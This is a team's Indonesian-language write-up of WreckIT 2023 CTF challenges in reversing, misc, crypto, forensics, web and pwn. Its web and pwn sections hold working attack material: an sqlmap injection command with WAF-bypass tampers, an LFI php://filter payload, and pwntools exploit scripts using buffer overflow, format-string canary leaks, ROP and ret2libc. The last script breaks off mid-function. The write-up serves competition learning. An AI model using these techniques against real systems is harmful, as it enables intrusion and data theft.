# Writeup WreckIT 2023
![](https://i.imgur.com/vyk3UFk.png)

Nama Team: yuk bisa yuk anyaaaaaa
Anggota:
    - Dimas
    - aimardcr

# Reverse Engineering
---
## REV Free Flag
### Description
anggep aja flag gratis bang. kasian banyak yang blom pernah nyentuh ctfd keknya

author: ayana_@Jhy
### Attachments
`chall.c`:
```c
#include<stdio.h>
#include<string.h>

int main(int argc, char **argv){
    int c[] = {119, 74, 101, 91, 107, 81, 116, 44, 16, 99, 20, 107, 76, 41, 127, 122, 20, 118, 71, 71, 80, 125, 82, 117, 17, 118, 84, 44, 20, 118, 127, 44, 84, 44, 83, 44, 78, 71, 78, 43, 87, 122, 73, 43, 127, 126, 82, 113, 69, 118, 68, 116, 89, 101};
    char inp[100];
    printf("apa flagnya\n");
    scanf("%s", &inp);
    int len = strlen(inp);
    if(len != 54){
        printf("bukan");
        return 0;
    }
    for(int i=0; i<len; i++){
        if(i%2==1 && inp[i] != (c[i] ^ 24)){
            printf("bukan");
            return 0;
        } else if (i%2==0  && inp[i] != (c[i] ^ 32)){
            printf("bukan");
            return 0;
        }
    }
    printf("mantap!!\n");
    return 0;
}
```
### Technical Review
Kita diberikan sebuah _source code_ dari sebuah program, yang dimana program ini akan melakukan perbandingan _input_ dari pengguna dengan `c` yang dimana `c` kita asumsikan sebagai flag.
### Solution
Seperti yang bisa kita lihat, `input[i]` akan dibandingkan dengan `c[i]`, yang dimana `c[i]` akan di xor terlebih dahulu dengan key `dec:32` jika `i%2==0` terpenuhi atau `c[i]` akan di xor dengan key `dec:24` jika `i%2==1` terpenuhi.

Berikut solusi yang kami gunakan:

`main.c`:
```c
#include <stdio.h>
#include <unistd.h>

int main() {
    int c[] = {119, 74, 101, 91, 107, 81, 116, 44, 16, 99, 20, 107, 76, 41, 127, 122, 20, 118, 71, 71, 80, 125, 82, 117, 17, 118, 84, 44, 20, 118, 127, 44, 84, 44, 83, 44, 78, 71, 78, 43, 87, 122, 73, 43, 127, 126, 82, 113, 69, 118, 68, 116, 89, 101};
    for (int i = 0; i < sizeof(c) / sizeof(c[0]); i++) {
        if (i % 2 == 0) {
            printf("%c", c[i] ^ 32);
        } else if (i % 2 == 1) {
            printf("%c", c[i] ^ 24);
        } else {
            printf("?");
        }
    }
    return 0;
}
```
Cukup compile menggunakan _command_:
```bash
gcc -o main main.c && ./main
```
Dan dapat flagnya!
FLAG: **WRECKIT40{4sl1_b4ng_perm1nt44n_4t4s4n_n3wbi3_friendly}**

---
## Uno Dos Tres
### Description
UNO (bahasa Spanyol dan bahasa Italia dari kata "satu") adalah sebuah permainan kartu yang dimainkan dengan kartu dicetak khusus (lihat Mau Mau untuk permainan yang hampir sama dengan kartu remi biasa). Permainan ini dikembangkan pada 1971 oleh Merle Robbins. Sekarang ini merupakan produk Mattel.

author: hanz0x17
### Attachments
`soaluno.elf`:
```
[Binary Data]: ELF 32-bit LSB executable, Atmel AVR 8-bit, version 1 (SYSV), statically linked, with debug_info, not stripped
```
### Technical Review
Kita diberikan sebuah program _Arduino_ yang memiliki arsitektur `Atmel AVR-8`,
Disini saya langsung buka _attachment_ `soaluno.elf` menggunakan `IDA Pro`.

Langsung terdapat string yang mencurigakan:
![](https://i.imgur.com/EUxNY6f.png)
`menjadi_reverse_engineer_adalah_citacitaku` yang awalnya kami kira anggap flag, namun ternyata bukan. Kemudian kami melihat terdapat _label_ `encrypted` pada IDA:
![](https://i.imgur.com/XKxzriC.png)

Disini karena _length_ atau panjang dari _key_ adalah `42`, maka kami coba lakukan xor antara `key` dan `encrypted`, yang dimana menghasilkan berikut:
![](https://i.imgur.com/9knsAU6.png)
FLAG: **WRECKIT40{M4r1_B3l4jar_Ardu1n0_B3rs4makuu}**

---
## Just Simple Asymetric
### Description
Aya melakukan penelitian pada SBOX suatu algoritma simetrik. Pada penelitian tersebut Ia menggunakan bahasa C dalam implementasinya. Apa yang terjadi??

author: wondPing
### Attachments
```
[Binary Data]: PE32+ executable (console) x86-64, for MS Windows
```
### Technical Review
Kita diberikan sebuah _executable_ untuk _Windows_, setelah dianalisa lebih lanjut menggunakan `IDA Pro`, program ini akan menerima masukkan / _input_ dari pengguna dari masukkan tersebut akan diproses menggunakan sebuah algoritma. Setelah kami analisa lebih lanjut, algoritma yang dilakukan merupakan algoritma RSA, hal ini didukung dengan ada nya `exp` (kita asumsi sebagai `exponent` dengan value), `lp` dan `lq` sebagai _Prime Numbers_:
![](https://i.imgur.com/v0JNOYB.png)

Bedanya RSA ini dengan _Challenge CTF RSA_ pada umumnya adalah pada RSA ini akan melakukan proses enkripsi pada setiap _char_, yang dimana pada _challenge_ umumnya _string_ akan diubah menjadi nilai _integer_ besar terlebih dahulu, dan diproses nilai tersebut sekali, yang dimana pada _challenge_ ini setiap nilai proses terpisah dengan `exp`, `p` dan `q` masing masing. Namun _twistnya_ disini masukkan akan diacak posisi setiap _char_ terlebih dahulu menggunakan permutasi.
### Solution
Karena kita sudah memiliki `p` dan `q`, maka kita cukup melakukan _decrypt_ dengan mengambil _private key_ dengan `p` dan `q` tersebut lalu kembalikan posisi setiap _char_, berikut _source_ yang kami gunakan:
```python
from Crypto.Util.number import *
import random

c = [
    0xEB02456, 0xE84AB16, 0x4A949955, 0x5ABB4FC2, 0x360EFAB2,
    0xC921C85, 0xAD616D0, 0x3FBCE485, 0xAA3963B, 0x3AD46054,
    0x27AF19A2, 0x601CE21C, 0x15646095, 0x300145F2, 0x548FFC34,
    0x4B18907, 0x221A76F2, 0x738C932, 0x174432F, 0xA9552F8,
    0x1FAB995B, 0x48670673, 0xA3CF7DA, 0x6690008E, 0x15065CFD,
    0x3BB9C830, 0x24ECE583, 0x18467E69, 0x345B8AD, 0xB18EF7F,
    0x63CF96, 0x4FE343A3, 0x3EF20745, 0x128C7155, 0x14B93E84,
    0x1C44ABD7, 0x14BD8964, 0x12FB5D3B, 0x1B15D290, 0x27A5C1A8,
    0x1D6A76D6, 0x61424699, 0x3DF09C57, 0x483B5080, 0xE5B5C84,
    0x1821AF4D, 0x171858DB, 0xB0E4264, 0x517E9A7, 0xCFB4F2,
    0x52448366, 0x228197C7, 0x29F89595, 0x122F299F, 0x3288DF76,
    0x14AC3FD3, 0x2BA72783, 0x268B7DD3
]

p = [
    0x52C3, 0x5E85, 0x6871, 0x7BC7, 0x4C79, 0x4C01, 0x5803, 0x58D3,
    0x4253, 0x4735, 0x5689, 0x7589, 0x431F, 0x548F, 0x6295, 0x7F33,
    0x7F63, 0x4AB1, 0x63C5, 0x6157, 0x63F5, 0x7159, 0x4B59, 0x7E43,
    0x64C1, 0x5B49, 0x69DF, 0x4E53, 0x4261, 0x4DF9, 0x4E3D, 0x68E1,
    0x6D0D, 0x4AD5, 0x66C5, 0x4BB3, 0x43AF, 0x5AA1, 0x7E29, 0x5F47,
    0x580F, 0x73C1, 0x4DB1, 0x723B, 0x6AC9, 0x534B, 0x6E3B, 0x4409,
    0x6D0D, 0x61C9, 0x5D4F, 0x7019, 0x5E45, 0x621D, 0x51A7, 0x585B,
    0x6415, 0x54DF,
]

q = [
    0xB449, 0xDDE7, 0xF4C3, 0xEA71, 0xC5D7, 0xF30B, 0xBE79,
    0xDE29, 0xFC59, 0xF047, 0xABC1, 0xDD6F, 0xCB53, 0xEC29,
    0xF359, 0xFB93, 0xDC75, 0x86A5, 0xCAE5, 0xCB71, 0x86E9,
    0xC95F, 0x82FD, 0xF70F, 0xB141, 0xC905, 0x881F, 0xA7C9,
    0xC211, 0x8D23, 0xAD53, 0xCB3B, 0xAE67, 0xE7CD, 0xB01B,
    0xFB75, 0xF403, 0xAEE3, 0x9991, 0xF20F, 0xEB6F, 0xDF67,
    0xD8A1, 0xBFE3, 0xC7E1, 0xDDED, 0xA129, 0xB587, 0xAFCF,
    0xDA77, 0xF835, 0xF773, 0xB7A9, 0x872F, 0xCC43, 0xE1BB,
    0xE3C5, 0xD405,      
]

urt = [0x0E, 0x2D, 0x24, 0x04, 0x37, 0x0C, 0x2A, 0x28, 0x2B, 0x35, 0x01, 0x00,
       0x38, 0x06, 0x17, 0x29, 0x10, 0x34, 0x18, 0x22, 0x32, 0x03, 0x1F, 0x15,
       0x21, 0x2F, 0x07, 0x33, 0x36, 0x0A, 0x31, 0x20, 0x23, 0x0D, 0x2E, 0x27,
       0x1C, 0x08, 0x13, 0x1A, 0x09, 0x25, 0x0F, 0x1E, 0x02, 0x11, 0x0B, 0x14,
       0x1B, 0x16, 0x30, 0x1D, 0x12, 0x39, 0x05, 0x2C, 0x19, 0x26]

e = 65537
LEN = 58

phi = [(p[i] - 1) * (q[i] - 1) for i in range(LEN)]
d = [inverse(e, phi[i]) for i in range(LEN)]
m = [pow(c[i], d[i], p[i] * q[i]) for i in range(LEN)]

flag = [None] * LEN
for i in range(LEN):
    for j in range(LEN):
        flag[urt[j]] = m[j]

for i in range(LEN):
    print(chr(flag[i]), end='')
```
FLAG: **WRECKIT40{5B0\*_C0m81n3_w17H_R3vE751n9_L0oK_50_1#73R35t!#9}**

---
# MISC
---
## Rabbithole
### Description
Anda tau Matryoshka Doll? kali ini aku gembok dengan sandi yang sangat secure!

author: AOD
### Attachments
`1000.zip`
### Technical Review
Kita diberikan _zip file_, yang dimana pada saat kita, file tersebut berisi daftar file berikut: 
![](https://i.imgur.com/QgFu8Ew.png)

file `pw999.txt` berisi sebuah _password_ yang digunakan untuk membuka _zip file_ `999_password.zip`, yang dimana `999_password.zip` berisi hal yang sama, jadi pada intinya _zip_ ini memiliki sistem rekursif yang dimana didalam _zip_ terdapat file _password_ dan `zip` yang dilindungi oleh _password_.
### Solution
Karena hampir terdapat seribu file _zip_, maka kami menggunakan _script_ berikut untuk menyelesaikan challenge tersebut:
```bash
for ((i = 999; i != 0; i--))
do
    zip_file="$i"_password.zip
    pwd_File="pw$i.txt"
    unzip -P $(cat $pwd_File) $zip_file
    unzip "$i".zip
done
```
Setelah proses setelah, terdapat file `flag.txt` dan dapat flagnya yang diformat dalam bentuk _hex_!
FLAG: **WRECKIT40{!_H0p3_u_d1dn'7_d0_i7_m4Nu411y_40D}**

---
## Iwanttocry
### Description
Budi hobi bermain dengan komputer, tapi kadang-kadang Budi suka gak hati-hati, akhirnya laptopnya Budi terkunci dengan ransomware!! Ransomware itu bisa menyebar kemana-mana jika tidak dihentikan..

Komputernya sudah diamankan dan dibawa ke spesialis malware. Bisakah malware tersebut dihentikan prosesnya?

Credential sudah diberikan dalam format terenkripsi supaya jaga-jaga. Binary ransomwarenya bernama "crying", gak tahu kenapa namanya itu..

```bash
ssh 167.71.207.218 -p 35022
```

Author: meshifox
### Attachments
`creds.txt`:
```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++++++.------------.+++++++++++.----------.+++++++.<------------.---..>--------------------.<----.++++.>+++++++++++++++.+++.<-----.++++.-----.>++++++++++++++++++...----------.<.
```
### Technical Review
Kita diberikan sebuah kasus dimana terdapat sebuah mesin yang terinfeksi oleh sebuah _Ransomware_, saat kita coba koneksikan menuju mesin tersebut, tentunya kita akan gagal karena _username default_ ketika melakukan koneksi adalah _username_ komputer kita, namun pada file `creds.txt` terdapat sebuah simbol-simbol, yang kami duga merupakan simbol dari bahasa estoterik `Brainfuck`. Setelah kita _decode_, terdapat teks berikut:
```
malbi:77U37dg261yyyo1
```
Disini kami mengasumsikan bahwa `malbi` merupakan _username_ mesin tersebut, sementara `77U37dg261yyyo1` merupakan _password_ mesin tersebut, dan benar saja kami dapat melakukan koneksi dengan kredensial tersebut:
![](https://i.imgur.com/8gLVEEB.png)

Setelah sedikit penelurusan, terdapat file yang berikut pada direktori `/opt`:
![](https://i.imgur.com/A3rOTy6.png)

Sayangnya disini file `flag.txt` hanya dapat dibaca oleh _user_ `root`.
Pada deskripsi soal, terdapat sebuah petunjuk bahwa _binary_ _Ransomware_ tersebut memiliki nama `crying`, dan benar saja, terdapat binary tersebut pada direktori `/usr/bin`:
![](https://i.imgur.com/fEJn4XQ.png)

Disini _binary_ `crying` dapat kita jalankan sebagai _user_ biasa, namun bagaimana kita menjalankan _binary_ tersebut, kita hanya akan mendapatkan _output_:
`Sob...`
![](https://i.imgur.com/DHhMSVx.png)

Oke, mari kita unduh _binary_ tersebut dengan command:
```
scp -P 35022 malbi@167.71.207.218:/usr/bin/crying .
```
Setelah dianalisa lebih lanjut menggunakan `IDA Pro`, _binary_ tersebut menggunakan `PyInstaller`.
`PyInstaller` merupakan sebuah aplikasi yang dapat menggabung beberapa _packages_ dan file _script Python_ menjadi satu file _executable_.
Disini kami menggunakan [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) untuk meng-_extract_ _script-script python_  yang sudah dibundle kedalam _binary_, setelah dijalankan, kami mendapatkan hasil berikut:
![](https://i.imgur.com/4IqaVzF.png)

Kami hanya terpaku pada satu file mencurigakan, yaitu `crying.pyc`.
_Script_ _python_ tersebut di-_compile_ dengan _python_ versi 3.8, maka dari itu kami menggunakan `uncompyle6` untuk melakulan _decompile_ pada _script_ tersebut, kamipun mendapatkan hasil _decompile_ dari _script_ `crying.pyc`:
```python
# uncompyle6 version 3.9.0
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.9 (tags/v3.8.9:a743f81, Apr  6 2021, 14:02:34) [MSC v.1928 64 bit (AMD64)]
# Embedded file name: crying.py
import requests, os

def check_domain(domain):
    try:
        response = requests.head(domain, timeout=5)
        return response.status_code == 200
    except:
        except requests.exceptions.RequestException:
        return False


domain = 'http://yieywvciwyefiowuteyrt63257486gdfewytifuywewhfg.co.ph'
if check_domain(domain):
    os.system('echo "I\'m no longer crying. Here\'s your flag:"')
    os.system('cat /opt/flag.txt')
    os.system('cp /etc/hosts.bak /etc/hosts')
else:
    print('Sob...')
# okay decompiling crying.pyc
```

Oke, pada intinya kode tersebut akan melakukan cek apakah domain `yieywvciwyefiowuteyrt63257486gdfewytifuywewhfg.co.ph` bisa diakses oleh mesin tersebut atau tidak. Kamipun menemukan bahwa file `/etc/hosts` merupakan _writable_ alias dapat kami ubah sebagai _user_ biasa.
### Solution
Karena file `/etc/hosts` dapat kita ubah, maka kita cukup melakukan _redirection_ pada domain diatas dengan sebuah _IP Address_ yang aktif pada sebuah website apapun, setelah menjalankan _command_ dibawah:
```bash
echo "36.88.105.19 yieywvciwyefiowuteyrt63257486gdfewytifuywewhfg.co.ph" >> /etc/hosts
```
dan menjalankan _binary_ `crying` dengan `sudo`, kami berhasil mendapatkan flagnya!
![](https://i.imgur.com/H0544e0.png)
FLAG: **WRECKIT40{R34l_c453_0f_w4NN4cRY}**

---
## Dibinah Diolah
### Description
Berikut Lagu Yang Sering Kami Nyanyikan Saat menjalani Pendidikan. Informasi Apa Saja yang bisa kalian dapatkan ?. Ingat ! Dimana Bumi Dipijak Disitu Langit Dijunjung https://youtu.be/BHadQFUDwLA

author: VascoZ
### Attachments
`20230331-224414.mp3`
### Technical Review
Kita diberikan sebuah file `mp3`, saat diputar, kita diberikan nyanyian lagu `KOPASSUS PANTANG MUNDUR` oleh seorang wanita dengan suara yang merdu~

Disini awalnya kami _stuck_ alias tidak tau harus apa, namun setelah diberikan _hint_ berikut:
```
Perbedaaan adalah segalanya. Taruna juga Gak suka Main Jauh-Jauh
```
Dari kata `perbedaan`, saya disini langsung mendengar kedua lagu dari file `mp3` dengan lagu aslinya, dan benar saja. Terdapat beberapa lirik yang diubah pada file `mp3`, berikut perbedaan liriknya:
```
Komando > Taruna
Belantara > Bidar Alam
Itulah istana tempat kita > Disana tempat bermain bola
```
Dan...ya, kami _stuck_ lagi. Disini kami sudah berputar pada area lapangan di _Google Maps_ pada lokasi `Poltek SSN`, namun tidak terdapat tempat yang bisa kita lihat _review_-nya. Namun ternyata, ketika kami lebih teliti dan mencoba _click_ pada lapangan pada _Google Maps_ di lokasi tersebut, terdapat sebuah tempat yang memiliki _review_, dan tentunya flagnya juga disana!
![](https://i.imgur.com/F8HCpfA.png)
Disini titik merah tersebut tidak terlihat pada _Google Maps_, yang menyebabkan kami _stuck_ berjam-jam :(, tapi akhirnya _solved_!
FLAG: **WRECKIT40{d1d1d1k_d4N_d1t3mp4}**

---
## Welcome
### Description
Flag: WRECKIT40{J4NG4N_lupa_Absen_YGYGY}

Link discord: https://discord.gg/WRha6pNr
## Solution
Tinggal submit dan kita dapat _free n juicy points_~
FLAG: **WRECKIT40{J4NG4N_lupa_Absen_YGYGY}**
## Survey
### Description
Sebelum turu, surve dulu

https://form.korpstar-poltekssn.org/index.php/199124?lang=id
### Solution
Tinggal submit lagi dan kita dapat _free n juicy points_~

FLAG: **WRECKIT40{M4KAS1H_UDAH_I51_SURV3Y_SEM0G4_F1N4L}**
# Cryptography
## CRYPTO Free Flag
### Description
Seorang NPC pergi ke Lawang Sewu dan mendapati suatu pintu dengan tulisan seperti password. Ada palang bertuliskan Bi UNTUK BINERRRRR!!! password is BiHB32R13

author: ayana_@Jhy
### Attachments
`soal.secret`:
```
00110100011000010011010001100001001101000011001100110101001101100011010000110101001101010011010100110100001100110011010100111001001101000110001000110101011000010011010000110100001101010011010000110100001110010011010001100100001101000011010000110011001100110011010001100010001101000011001000110100001100110011010100110101001101010011100100110101001100010011001100110010001101000011100000110100001110010011010001100001001101010011000000110101001101110011010001100110001101010011100100110101001101000011010101100001001101000110010000110100011000010011010100110001001101010011100000110100001110010011001100110101001101010011010000110100001100100011010001100011001100110011010100110101001110000011010000111000001101010011000100110011001100100011010000110011001100110011011100110100011001100011010000110110001101010011001000110100001101110011010000110011001100110011010100110100001100100011010000110010001101000011010100110100001101010011010100110111001101000011011000110011001101100011001100110110001101000011010000110100001110010011010001100100001101010011011000110101001110000011010000110111001101000011001100110011001101010011010000110011001101000011010000110100011001100011010001100001001100110011010100110100001101110011001100110100001101010011100100110100011000110011010001100110001101000110010000110101011000010011010100111000001101000011011100110100001100110011010100111000001100110011001100110101001101100011010001100110001101000110000100110011001100100011010100111000001101000011010100110011001101010011010001100011001101010011001100110101001100000011010100110101001100110110010000110011011001000011001101100100001100110110010000110011011001000011001101100100
```
### Technical Review
Kita diberikan sebuah kasus, pada intinya kita diberi clue bahwa _password_-nya adalah `BiHB32R13`. Awalnya kami mengira _password_ tersebut merupakan `XOR Key`, namun terdapat _password_ tersebut merupakan susunan enkrispi untuk `soal.secret`,

Bi = Binary
H = Hex
B32 = Base32
R13 = Rotate 13

Cukup menggunakan `CyberChef` untuk melakukan dekripsi secara otomatis:
![](https://i.imgur.com/3nTHOMS.png)

FLAG: **WRECKIT40{CRYPTO_tolongin_aku_dong!!,_kurangPemanasan_hehehe}**

---
# Forensic
## Mixxedup
### Description
Tidak hanya minumam keras yang membuat mabuk, pict el ini juga membuat saya mabuk

author: AOD
### Attachments
`c.jpg`
### Technical Review
Kita diberikan sebua file gambar, saat ditelurusi lebih lanjut menggunkana berbagai macam aplikasi `steg`, tidak terdapat apapun yang mencurigakan.

Namun ketika menggunakan `binwalk`, terdapat beberapa file yang tersembunyi:
![](https://i.imgur.com/GOf9tVC.png)

Terdapat sebuah _zip_ yang tersembunyi, yang dimana isi dari _zip_ tersebut merupakan:
`dobleh.txt`:
```
saya aslinya 400, sekarang 2000
```
`flag.png`:
![](https://i.imgur.com/A4QmQRy.png)

Oke, dari _hint_ yang diberikan di `dobleh.txt`, kita tau bahwa ukuran asli gambar ini merupakan 400, namun ketika dilakukan `pngcheck`, _CRC_ dari gambar tersebut tidak terdapat masalah alias memiliki _integrity_ yang sesuai.

Disini kami bingung harus diapakan, namun ketika lebih teliti, terdapat tulisan-tulisan pada gambar tersebut pada warna yang berbeda, disini juga ukuran gambar adalah 2000 _pixel_, disini kami langsung berasumsi bahwa kami perlu memisahkan setiap, maka dari itu kami mencoba solusi berikut:
```python
from PIL import Image

image = Image.open("flag.png")
new_image = Image.new("RGB", (400, 400), (0, 0, 0))

step = 0
for x in range(400):
    for y in range(400):
        r, g, b = image.getpixel((step, y))

        new_image.putpixel((x, y), (r, g, b))
    step += 5

new_image.save("new_image.png")
```
dan ketika dijalankan, benar saja terdapat _partial flag_ dari gambar pertama:
![](https://i.imgur.com/PVTYk7y.png)
lalu kita ubah sedikit kode-nya untuk mendapatkan gambar kedua:
```python
from PIL import Image

image = Image.open("flag.png")
new_image = Image.new("RGB", (400, 400), (0, 0, 0))

step = 0
for x in range(400):
    for y in range(400):
        r, g, b = image.getpixel((step + 1, y)) # Perubahan disini

        new_image.putpixel((x, y), (r, g, b))
    step += 5

new_image.save("new_image.png")
```
![](https://i.imgur.com/t7ayPX4.png)

Setelah kami _decode_ base64 `V1JFQ0tJVDQwe3AxeDNMc19NNGszX00zX0MwbmZ1NTNkXzQwRH0=` dan dapat flagnya!
FLAG: **WRECKIT40{p1x3Ls_M4k3_M3_C0nfu53d_40D}**
# Web
## jwttt
### Description
Masuklah dengan login

author: ryndrr#2727
http://167.71.207.218:50620 

### Technical Review
Pada challenge ini kita diberikan website yang didalamnya blank seperti berikut:

![](https://i.imgur.com/JB6PFzu.png)

Website ini menggunakan react, dan kita dapat melihat source code react nya menggunakan developer console:

![](https://i.imgur.com/BrtOJya.png)

### Solution
Saat kita di developer console, kita perlu masuk ke folder `/app/src/component/flag.js` dimana didalamnya terdapat flag seperti berikut:

![](https://i.imgur.com/fz9g89a.png)

## register
### Description
Mau daftar ikut lomba? Silahkan akses web ini. Eh tapi tidak bisa register, lah gimana peserta mau join coba? Mungkin sebenarnya ada tapi tidak langsung terlihat, harus lebih jeli saja.

Author: meshifox
http://167.71.207.218:35081 

### Technical Review
Pada challenge ini kita akan diberikan website seperti berikut:

![](https://i.imgur.com/I8V770f.png)

Website login page sederhana yang tidak ada tanda-tanda tombol register, mungkin?

### Solution
Untuk mengerjakan challenge ini kita diperlukan untuk melakukan fuzzing pada website. Disini saya menggunakan applikasi `ffuf` seperti berikut untuk mendapatkan hidden directory:

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://167.71.207.218:35081/FUZZ.php
```

Output:

![](https://i.imgur.com/J3g4i85.png)

Disitu kita akan melihat endpoint `signup.php` yang kita bisa akses di http://167.71.207.218:35081/signup.php.

![](https://i.imgur.com/SKYL4In.png)

Setelah kita akses kita akan menemukan login page seperti diatas. Disini kita bisa menginputkan username, email, dan password palsu kita ke form.

![](https://i.imgur.com/4TWNqor.png)

Setelah kita submit maka akan tampil merah-merah seperti berikut

![](https://i.imgur.com/h2QZj8B.png)

Dan saat kita melihat ke source code website kita akan menemukan script js yang ter-embed disana.

![](https://i.imgur.com/Xh2fPMD.png)

Ini kita copas ke https://deobfuscate.io/ agar mudah dibaca. 

![](https://i.imgur.com/TjhX0Mg.png)

Setelah itu kita copy paste kode tersebut di file html kita untuk melakukan debugging, tambahkan alert seperti pada gambar dibawah ini:

![](https://i.imgur.com/RnDsQNK.png)

Kita jalankan html tersebut di browser, maka kita akan mendapatkan alert seperti berikut:

![](https://i.imgur.com/aalaPJ3.png)


output dari alert tersebut setelah di deobfuscate:
```javascript
var postRequest = new XMLHttpRequest;
postRequest.open("POST", "http://localhost/");
postRequest.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
postRequest.send(JSON.stringify({text: '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Send mail</title><style>.wrapper {padding: 20px;color: #444;font-size: 1.3em;}a {background: #592f80;text-decoration: none;padding: 8px;15px;border-radius: 5px;color: #fff;}</style></head><body><div class="wrapper"><p>Thank you for signing up on our site. Please click on the link below to verify your account:.</p><a href="http://localhost/verify_email.php?token=53f5f385a178ea4648356af3ce577bc0c4f7a366d85784e7e6283c8cf068b56b">Verify Email!</a></div></body></html>', complete: false}));
postRequest.onreadystatechange = function () {
  if (postRequest.readyState === 4) {
    var data = JSON.parse(postRequest.responseText);
    console.log(data);
  }
};

```
Kita bisa melihat bahwa ada `/verify_email.php?token=53f5f385a178ea4648356af3ce577bc0c4f7a366d85784e7e6283c8cf068b56b` di dalam source code diatas, ini bisa kita gunakan untuk memverfikasi email kita dengaan mengaksesnya melalui url seperti berikut: http://167.71.207.218:35081/verify_email.php?token=53f5f385a178ea4648356af3ce577bc0c4f7a366d85784e7e6283c8cf068b56b

Setelah kita mengakses link tersebut maka kita sekarang bisa login sebagai user yang kita buat tadi.

![](https://i.imgur.com/lGOm3CC.png)

Dari sini kita bisa mengakses dashboard, dimana disitu terdapat LFI seperti berikut.

![](https://i.imgur.com/8JPno5U.png)

Karna website ini menggunakan php, bisa kita asumsikan bahwa website tersebut menggunakan fungsi [file_get_contents](https://www.php.net/manual/en/function.file-get-contents.php).

Kita bisa menambahkan filter php://filter/read=string.rot13/resource=index.php untuk membaca index.php, yang dimana file tersebut terdapat flag yang kita cari.

![](https://i.imgur.com/Mo7o5qe.png)

Kita decode dari rot13: 

![](https://i.imgur.com/OjHf0UN.png)

## Simplekok
### Description
Pemanasan Dulu dengan yang Simple - Simple, Jalan Jalan ke Kota Bantul, Hacker Kok Pake tuls

author: VascoZ
http://167.71.207.218:50621 

### Technical Review
Pada challenge ini kita diberikan website yang vulnerable dengaan SQL Injection.

http://167.71.207.218:50621/

![](https://i.imgur.com/EHSbOvM.png)

Tetapi ada beberapa waf yang mengganggu, jadi kita harus bisa membypassnya, dan mendapatkan sql injection.
### Solution
Disini saya menggunakan tools sqlmap dengan tamper randomcase dan juga space2comment untuk membypass waf yang terdapat di server.


```shell
sqlmap -u http://167.71.207.218:50621/logins.php -X POST --data "username=foo&passw0rd='*&login-btn=" --batch --tamper=randomcase,space2comment -D web_blindsql --dump --time-sec 1 --threads=10
```

Output:

![](https://i.imgur.com/L7fW53d.png)


# Pwn
## PWN Free Flag 
### Description
anggep aja flag gratis bang. kasian banyak yang blom pernah nyentuh ctfd keknya

author: flyyy
nc 167.71.207.218 50602 

### Technical Review
Pada challenge ini kita akan diberikan attachment berupa binary, yang dimana binary tersebut vulnerable dengan buffer overflow.

### Solution
Saat kita melihat ke ida64 kita akan menemukan sebuah fungsi yang bisa membaca flagnya:

![](https://i.imgur.com/CW2jnCo.png)

Disini kita hanya perlu untuk merubah variable v2 menjadi 2024.

Solve script:
```python 
from pwn import *
import sys

BINARY = "chall"
context.binary = exe = ELF(BINARY, checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

x, p = init()
x.debug((
    "source /usr/share/gef/gef.py\n"
    "finish\n"*5
))

p.sendline(cyclic(508)+p64(2024))
p.interactive()
```

## Menari Bersama
### Description
Mari menari bersamaku

author: itoid#8709
nc 167.71.207.218 50600 

### Technical Review
Di challenge ini kita akan diberikan binary yang dimana binary tersebut vulnerable dengan serangan format string vulnerability dan juga buffer overflow.

### Solution
Yang pertama perlu kita lakukan pada challenge ini adalah menleak canary dengan menggunakan format string vulnerability. Setelah itu kita perlu menggunakan serangan buffer overflow untuk mengendalikan return address dan return ke fungsi `bss`

![](https://i.imgur.com/zVj4zm5.png)

Solver:
```python 
from pwn import *
import sys

BINARY = "menaribersama"
context.binary = exe = ELF(BINARY, checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"

libc =  ELF("/lib/libc.so.6", checksec=False)


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)


def brute():
    with context.silent:
        for i in range(50):
            x, p = init()
            p.sendline(f"%{i}$p".encode())
            p.recvline_contains(b"Nama")
            data = p.recvline().strip().decode()
            p.close()
            if data.endswith("00"):
                print(i, data)
                # 43 0xd306b7dd42ee8200


# brute()
x, p = init()
x.debug((
    "source /usr/share/gef/gef.py\n"
    "break *tidakaman+138\n"
    "c"
))

p.sendline(b"%43$p %1$p")
p.recvline_contains(b"Nama")
[canary, libc_addr] = p.recvline().decode().split()
canary = eval(canary)
libc.address = eval(libc_addr)-1935683
log.info("canary: 0x%x", canary)
log.info("libc: 0x%s", libc)

r = ROP(exe)
r.raw(r.find_gadget(['ret']))
r.call("bss")


p.sendline(flat(
    cyclic(296),
    canary, 0, r
))

p.interactive()
```

## Copycat
### Description
Copycat 4.8.2

author: itoid#8709
nc 167.71.207.218 50601 

### Technical Review
Pada challenge ini kita akan diberikan binary, yang dimana binary tersebut vulnerable dengan serangan format string yang tak terbatas dan juga buffer overflow.

### Solution
Untuk menyelesaikan challenge ini kita perlu untuk mendapatkan libc dari server yang akan kita serang, untuk mendapatkan libcnya kita dapat menggunakan vulnerablity format string dan melakukan read ke bagian got pada binary server, dan nantinya kita bisa menggunakan website berikut  https://libc.rip/ untuk mendapatkan libcnya.

Setelah itu kita bisa melakukan teknik serangan ret2libc dan meng-call fungsi system untuk mendapatkan RCE.

![](https://i.imgur.com/NF5ortO.png)

Solver:
```python
from pwn import *
import sys

BINARY = "copycat_patched"
context.binary = exe = ELF(BINARY, checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"

libc = ELF("libc.so.6", checksec=False)


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def sendfmt(self, payload):
        p = self.p
        p.sendline(payload)
        return p.recvline().strip()


def checker():
    j = {0: 1}

